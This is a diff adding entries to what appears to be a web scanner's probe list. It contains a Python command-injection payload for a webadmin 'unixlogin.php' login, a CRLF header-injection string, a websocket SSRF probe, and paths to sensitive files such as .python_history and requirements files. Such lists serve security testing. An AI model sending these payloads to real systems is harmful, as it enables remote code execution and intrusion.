@@ -1,0 +1,13 @@
+/webadmin/tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%27{{url_encode(hex_encode(cmd))}}%27.decode%28%27hex%27%29%29%23&timeout=5
+/webadmin/out
+/render/info.html
+/admin/login/
+/setup.py
+/.python_history
+/requirements.txt
+/requirements/requirements.txt
+/app/requirements.txt
+/src/requirements.txt
+/metrics
+/%0d%0aSet-Cookie:crlfinjection=1;
+?url=ws://example.com/
